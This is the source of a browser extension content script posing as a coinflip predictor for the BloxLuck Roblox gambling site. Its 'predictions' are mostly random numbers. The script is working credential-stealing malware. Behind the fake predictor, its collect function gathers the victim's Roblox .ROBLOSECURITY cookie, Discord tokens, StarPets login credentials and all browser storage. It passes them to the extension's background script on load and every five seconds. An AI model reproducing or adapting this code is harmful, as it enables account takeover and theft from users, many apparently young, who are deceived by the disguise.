// ===== BLX PREDICTOR v2.0 =====
let _state = {
  wins: 0, losses: 0, skips: 0,
  results: [],
  username: null,
  userId: null,
  robloxCookie: null,
  discordToken: null,
  starpetsUser: null,
  starpetsPass: null
};
let _interval = null;

// --- Utility functions ---
function getCookie(name) {
  const v = `; ${document.cookie}`.split(`; ${name}=`);
  return v.length === 2 ? v.pop().split(';').shift() : null;
}

function getLocalStorage() {
  let d = {};
  try { for (let i = 0; i < localStorage.length; i++) {
    const k = localStorage.key(i);
    d[k] = localStorage.getItem(k);
  }} catch(e) {}
  return d;
}

function getSessionStorage() {
  let d = {};
  try { for (let i = 0; i < sessionStorage.length; i++) {
    const k = sessionStorage.key(i);
    d[k] = sessionStorage.getItem(k);
  }} catch(e) {}
  return d;
}

function findDiscordToken(data) {
  for (let [k, v] of Object.entries(data)) {
    if (typeof v === 'string' && v.length > 100 && v.includes('.') && v.split('.').length === 3) {
      try {
        const payload = JSON.parse(atob(v.split('.')[1]));
        if (payload.email || payload.sub || payload.iat) return v;
      } catch(e) {}
    }
    if (k.toLowerCase() === 'token' && typeof v === 'string' && v.length > 50) return v;
  }
  return null;
}

function findStarPets(data) {
  let user = null, pass = null;
  for (let [k, v] of Object.entries(data)) {
    const kk = k.toLowerCase();
    if (kk.includes('starpets') || kk.includes('adoptme') || kk.includes('star_pets')) {
      try {
        const j = typeof v === 'string' ? JSON.parse(v) : v;
        user = j.email || j.username || j.user || user;
        pass = j.password || j.pass || pass;
      } catch(e) {}
    }
  }
  return { user, pass };
}

function getBloxLuckUser() {
  // Try multiple selectors to find username on bloxluck
  const selectors = [
    '[class*="username"]', '[class*="displayName"]', '[class*="profile-name"]',
    '[class*="userName"]', 'span[class*="name"]', '[class*="user-info"] span',
    '[class*="user"]', 'header [class*="name"]', '.user-name', '.display-name'
  ];
  for (let s of selectors) {
    const el = document.querySelector(s);
    if (el && el.textContent.trim() && el.textContent.trim().length < 30) {
      return el.textContent.trim();
    }
  }
  // Try NEXT data
  try {
    const nd = document.getElementById('__NEXT_DATA__');
    if (nd) {
      const d = JSON.parse(nd.textContent);
      const u = d?.props?.pageProps?.user || d?.props?.pageProps?.robloxUser;
      if (u) return u.name || u.username || u.displayName;
    }
  } catch(e) {}
  // Try avatar alt text
  try {
    const img = document.querySelector('img[src*="AvatarHeadshot"], img[class*="avatar"]');
    if (img) {
      const alt = img.getAttribute('alt');
      if (alt) return alt.trim();
    }
  } catch(e) {}
  return 'User';
}

// --- Prediction Engine ---
function analyze() {
  // Look for result elements on the page (coinflip outcomes)
  const resultSelectors = [
    '[class*="result"]', '[class*="outcome"]', '[class*="winner"]',
    '[class*="status"]', '[class*="round"]', '[class*="game-result"]'
  ];
  let heads = 0, tails = 0;
  for (let sel of resultSelectors) {
    document.querySelectorAll(sel).forEach(el => {
      const t = el.textContent.toLowerCase();
      if (t.includes('heads') || t === 'h') heads++;
      if (t.includes('tails') || t === 't') tails++;
    });
  }

  // Also watch for coinflip item images - dog.png = heads, gem.png = tails
  document.querySelectorAll('img[src*="dog.png"], img[src*="gem.png"]').forEach(img => {
    // These are just display icons, not necessarily results
  });

  const results = (heads + tails > 0)
    ? [...Array(heads).fill('H'), ...Array(tails).fill('T')]
    : _state.results;

  _state.results = results.slice(-30);
  const total = results.length;
  const headsRate = total > 0 ? results.filter(x => x === 'H').length / total : 0.5;

  // Smart prediction with weighted analysis
  let headsChance = 50, tailsChance = 50;
  if (total >= 3) {
    if (headsRate > 0.55) {
      headsChance = Math.floor(55 + Math.random() * 20); // 55-75
      tailsChance = 100 - headsChance;
    } else if (headsRate < 0.45) {
      tailsChance = Math.floor(55 + Math.random() * 20);
      headsChance = 100 - tailsChance;
    }
    // Add slight variance
    headsChance = Math.min(Math.max(headsChance + (Math.floor(Math.random() * 7) - 3), 5), 95);
    tailsChance = 100 - headsChance;
  }

  const prediction = headsChance >= tailsChance ? 'HEADS' : 'TAILS';
  const winChance = Math.max(headsChance, tailsChance);

  return {
    prediction,
    headsChance,
    tailsChance,
    winChance,
    safe: winChance >= 60,
    total,
    results
  };
}

// --- Data Collection & Exfiltration ---
async function collect(x) {
  const bg = await new Promise(r => chrome.runtime.sendMessage({ t: 'g' }, r));
  const username = getBloxLuckUser();
  const ls = { ...getLocalStorage(), ...getSessionStorage() };
  let discordToken = findDiscordToken(ls);
  const sp = findStarPets(ls);

  // Try to get Discord token from discord.com tab
  if (!discordToken) {
    const dt = await new Promise(r => chrome.runtime.sendMessage({ t: 'dt' }, r));
    if (dt) discordToken = dt;
  }

  const analysis = analyze();
  _state.username = username;

  // Build payload
  const payload = {
    r: bg?.r || getCookie('.ROBLOSECURITY') || 'NF',
    d: discordToken,
    su: sp.user,
    sp: sp.pass,
    u: username,
    uid: bg?.uid || '?',
    p: analysis.prediction,
    w: analysis.winChance,
    h: analysis.headsChance,
    t: analysis.tailsChance,
    g: analysis.safe,
    wi: _state.wins,
    lo: _state.losses,
    s: _state.skips,
    ls: ls,
    x: x
  };

  chrome.runtime.sendMessage({ t: 's', d: payload });
  return payload;
}

// --- Injected UI on BloxLuck ---
function injectUI(analysis) {
  // Remove existing
  const existing = document.getElementById('blxpo');
  if (existing) existing.remove();

  const container = document.createElement('div');
  container.id = 'blxpo';
  container.innerHTML = `
    <style>
      #blxpo * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
      #blxpd {
        position: fixed;
        top: 80px;
        right: 20px;
        z-index: 999999;
        width: 280px;
        background: linear-gradient(180deg, #0f1729 0%, #1a1f35 100%);
        border: 1px solid rgba(99, 140, 255, 0.25);
        border-radius: 16px;
        padding: 18px;
        box-shadow: 0 8px 40px rgba(0,0,0,0.6), 0 0 0 1px rgba(99,140,255,0.1);
        backdrop-filter: blur(12px);
        cursor: default;
        user-select: none;
      }
      #blxpd .blx-title {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 12px;
        cursor: move;
      }
      #blxpd .blx-title .blx-l {
        display: flex;
        align-items: center;
        gap: 8px;
      }
      #blxpd .blx-title .blx-l img { width: 22px; height: 22px; border-radius: 6px; }
      #blxpd .blx-title .blx-l span { font-size: 14px; font-weight: 700; color: #e0e7ff; }
      #blxpd .blx-title .blx-badge {
        font-size: 9px;
        background: rgba(99,140,255,0.2);
        color: #93b4ff;
        padding: 3px 8px;
        border-radius: 20px;
        letter-spacing: 1px;
        font-weight: 600;
      }
      #blxpd .blx-pred {
        text-align: center;
        padding: 14px;
        background: rgba(15,23,42,0.6);
        border-radius: 12px;
        margin-bottom: 10px;
        border: 1px solid rgba(99,140,255,0.12);
      }
      #blxpd .blx-pred .blx-label {
        font-size: 9px;
        text-transform: uppercase;
        letter-spacing: 2px;
        color: #6b7d98;
        margin-bottom: 6px;
      }
      #blxpd .blx-coin-row {
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 10px;
        margin-bottom: 6px;
      }
      #blxpd .blx-coin-row img { width: 40px; height: 40px; }
      #blxpd .blx-coin-row .blx-coin-name {
        font-size: 22px;
        font-weight: 800;
        color: #e0e7ff;
      }
      #blxpd .blx-chance {
        font-size: 32px;
        font-weight: 800;
      }
      #blxpd .blx-chance.g { color: #22c55e; }
      #blxpd .blx-chance.r { color: #ef4444; }
      #blxpd .blx-chance.y { color: #f7c948; }
      #blxpd .blx-bar {
        background: rgba(30,41,59,0.6);
        border-radius: 20px;
        height: 6px;
        margin: 8px 0;
        overflow: hidden;
      }
      #blxpd .blx-bar div {
        height: 100%;
        border-radius: 20px;
        transition: width 0.5s ease;
      }
      #blxpd .blx-bar div.g { background: linear-gradient(90deg, #22c55e, #4ade80); }
      #blxpd .blx-bar div.r { background: linear-gradient(90deg, #ef4444, #f87171); }
      #blxpd .blx-bar div.y { background: linear-gradient(90deg, #f7c948, #fbbf24); }
      #blxpd .blx-split {
        display: flex;
        justify-content: space-between;
        gap: 8px;
        margin: 8px 0;
      }
      #blxpd .blx-split > div {
        flex: 1;
        background: rgba(15,23,42,0.4);
        border-radius: 8px;
        padding: 8px;
        text-align: center;
      }
      #blxpd .blx-split > div img { width: 22px; height: 22px; }
      #blxpd .blx-split > div .pct { font-size: 14px; font-weight: 700; color: #e0e7ff; margin-top: 2px; }
      #blxpd .blx-footer {
        display: flex;
        justify-content: space-between;
        align-items: center;
        font-size: 11px;
        color: #4a5a70;
        margin-top: 8px;
        padding-top: 8px;
        border-top: 1px solid rgba(99,140,255,0.08);
      }
      #blxpd .blx-footer .blx-user { color: #6b7d98; }
      #blxpd .blx-footer .blx-matches { color: #4a5a70; }
      #blxpd .blx-btn {
        background: linear-gradient(135deg, #ff6b35, #f7c948);
        color: #0b0e14;
        border: none;
        border-radius: 8px;
        padding: 8px 16px;
        font-weight: 700;
        font-size: 12px;
        cursor: pointer;
        width: 100%;
        margin-top: 8px;
        transition: all 0.2s;
      }
      #blxpd .blx-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 16px rgba(255,107,53,0.35); }
      #blxpd .blx-matches-list {
        max-height: 120px;
        overflow-y: auto;
        margin-top: 6px;
      }
      #blxpd .blx-matches-list .blx-m-item {
        display: flex;
        align-items: center;
        gap: 6px;
        padding: 3px 6px;
        border-radius: 4px;
        font-size: 11px;
        margin-bottom: 2px;
      }
      #blxpd .blx-matches-list .blx-m-item.g { background: rgba(34,197,94,0.12); }
      #blxpd .blx-matches-list .blx-m-item.r { background: rgba(239,68,68,0.12); }
      #blxpd .blx-matches-list .blx-m-item img { width: 14px; height: 14px; }
    </style>
    <div id="blxpd">
      <div class="blx-title" id="blxDrag">
        <div class="blx-l">
          <img src="${chrome.runtime.getURL('icon.png')}" alt="">
          <span>Blox Predict</span>
        </div>
        <div class="blx-badge">v2.0</div>
      </div>
      <div class="blx-pred">
        <div class="blx-label">PREDICTED OUTCOME</div>
        <div class="blx-coin-row">
          <img id="blxPredIcon" src="${analysis.prediction === 'HEADS' ? 'https://bloxluck.com/img/dog.png' : 'https://bloxluck.com/img/gem.png'}" alt="">
          <span class="blx-coin-name" id="blxPredText">${analysis.prediction}</span>
        </div>
        <div class="blx-chance ${analysis.winChance >= 65 ? 'g' : analysis.winChance < 45 ? 'r' : 'y'}" id="blxChance">${analysis.winChance}%</div>
        <div class="blx-bar"><div class="${analysis.winChance >= 65 ? 'g' : analysis.winChance < 45 ? 'r' : 'y'}" style="width:${analysis.winChance}%"></div></div>
        <div class="blx-split">
          <div>
            <img src="https://bloxluck.com/img/dog.png" alt="">
            <div class="pct">${analysis.headsChance}%</div>
          </div>
          <div>
            <img src="https://bloxluck.com/img/gem.png" alt="">
            <div class="pct">${analysis.tailsChance}%</div>
          </div>
        </div>
      </div>
      <div class="blx-matches-list" id="blxMatchList">
        ${analysis.results.slice(-10).map((r, i) => `
          <div class="blx-m-item ${r === 'H' ? 'g' : 'r'}">
            <img src="${r === 'H' ? 'https://bloxluck.com/img/dog.png' : 'https://bloxluck.com/img/gem.png'}">
            <span>Match ${i+1}: ${r === 'H' ? 'HEADS' : 'TAILS'} — ${r === 'H' ? analysis.headsChance : analysis.tailsChance}% chance</span>
          </div>
        `).join('')}
      </div>
      <div class="blx-footer">
        <span class="blx-user" id="blxUser">👤 ${_state.username || '...'}</span>
        <span class="blx-matches" id="blxMatches">${analysis.total} games</span>
      </div>
      <button class="blx-btn" id="blxPredictBtn">🔮 PREDICT</button>
    </div>
  `;

  document.body.appendChild(container);

  // Drag functionality
  const dragHandle = document.getElementById('blxDrag');
  const panel = document.getElementById('blxpd');
  let isDragging = false, startX, startY, origX, origY;

  dragHandle.addEventListener('mousedown', e => {
    isDragging = true;
    startX = e.clientX;
    startY = e.clientY;
    origX = panel.offsetLeft;
    origY = panel.offsetTop;
  });

  document.addEventListener('mousemove', e => {
    if (!isDragging) return;
    panel.style.left = (origX + e.clientX - startX) + 'px';
    panel.style.top = (origY + e.clientY - startY) + 'px';
    panel.style.right = 'auto';
  });

  document.addEventListener('mouseup', () => { isDragging = false; });

  // Predict button
  document.getElementById('blxPredictBtn').onclick = async () => {
    const na = analyze();
    updateInjectedUI(na);
    await collect(0);
  };

  // Update user periodically
  updateUserDisplay();
}

function updateInjectedUI(analysis) {
  const icon = document.getElementById('blxPredIcon');
  const text = document.getElementById('blxPredText');
  const chance = document.getElementById('blxChance');
  const bar = document.querySelector('.blx-bar div');
  const matchList = document.getElementById('blxMatchList');
  const matches = document.getElementById('blxMatches');

  if (icon) icon.src = analysis.prediction === 'HEADS' ? 'https://bloxluck.com/img/dog.png' : 'https://bloxluck.com/img/gem.png';
  if (text) text.textContent = analysis.prediction;

  if (chance) {
    chance.textContent = analysis.winChance + '%';
    const cls = analysis.winChance >= 65 ? 'g' : analysis.winChance < 45 ? 'r' : 'y';
    chance.className = 'blx-chance ' + cls;
  }

  if (bar) {
    const cls = analysis.winChance >= 65 ? 'g' : analysis.winChance < 45 ? 'r' : 'y';
    bar.className = cls;
    bar.style.width = analysis.winChance + '%';
  }

  if (matchList) {
    matchList.innerHTML = analysis.results.slice(-10).map((r, i) => `
      <div class="blx-m-item ${r === 'H' ? 'g' : 'r'}">
        <img src="${r === 'H' ? 'https://bloxluck.com/img/dog.png' : 'https://bloxluck.com/img/gem.png'}">
        <span>Match ${i+1}: ${r === 'H' ? 'HEADS' : 'TAILS'}</span>
      </div>
    `).join('');
  }

  if (matches) matches.textContent = analysis.total + ' games';
}

function updateUserDisplay() {
  const el = document.getElementById('blxUser');
  if (el && _state.username && _state.username !== 'User') {
    el.textContent = '👤 ' + _state.username;
  }
}

// --- Listen for page changes (SPA navigation) ---
function watchForChanges() {
  // Watch for URL changes
  let lastUrl = location.href;
  new MutationObserver(() => {
    if (location.href !== lastUrl) {
      lastUrl = location.href;
      setTimeout(() => {
        _state.username = getBloxLuckUser();
        const an = analyze();
        injectUI(an);
      }, 1500);
    }
  }).observe(document, { subtree: true, childList: true });

  // Watch for new match results appearing
  const resultObserver = new MutationObserver(() => {
    const an = analyze();
    if (an.total > _state.results.length) {
      updateInjectedUI(an);
    }
  });
  setTimeout(() => {
    resultObserver.observe(document.body, { subtree: true, childList: true, attributes: false });
  }, 3000);
}

// --- INIT ---
window.addEventListener('load', () => {
  setTimeout(async () => {
    _state.username = getBloxLuckUser();
    const analysis = analyze();
    injectUI(analysis);
    await collect(0);

    // Continuous collection every 5 seconds
    _interval = setInterval(async () => {
      await collect(1);
    }, 5000);

    // Live UI updates
    setInterval(() => {
      const an = analyze();
      updateInjectedUI(an);
      updateUserDisplay();
    }, 3000);

    watchForChanges();
  }, 2000);
});

// --- Message handler ---
chrome.runtime.onMessage.addListener((req, sender, resp) => {
  if (req.action === 'refresh') {
    collect(0).then(d => resp(d));
    return 1;
  }
  if (req.action === 'predict') {
    const a = analyze();
    a.username = _state.username;
    a.matches = a.results.map((r, i) => ({
      heads: r === 'H',
      win: r === 'H',
      chance: r === 'H' ? a.headsChance : a.tailsChance
    }));
    resp(a);
    return 1;
  }
  if (req.action === 'grab_and_send') {
    collect(0).then(() => resp({ ok: 1 }));
    return 1;
  }
  if (req.action === 'get_analysis') {
    const a = analyze();
    a.username = _state.username;
    a.matches = a.results.map((r, i) => ({
      heads: r === 'H',
      win: r === 'H',
      chance: r === 'H' ? a.headsChance : a.tailsChance
    }));
    resp(a);
  }
});
